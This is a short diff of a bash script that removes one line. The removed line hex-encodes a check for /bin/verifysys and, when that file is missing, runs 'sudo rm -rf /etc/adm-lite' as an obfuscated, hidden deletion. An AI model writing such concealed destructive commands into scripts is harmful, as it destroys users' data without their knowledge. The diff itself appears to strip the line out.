@@ -1,6 +1,5 @@
 #!/bin/bash
 
-[[ ! -e $(echo -e $(echo "2f62696e2f766572696679737973"| sed 's/../\\x&/g;s/$/ /')) ]] && sudo $(echo -e $(echo "726D202D7266202f6574632f61646d2d6c697465"| sed 's/../\\x&/g;s/$/ /'))
 subdom () {
 SUBDOM="$1"
 [[ "$SUBDOM" = "" ]] && return
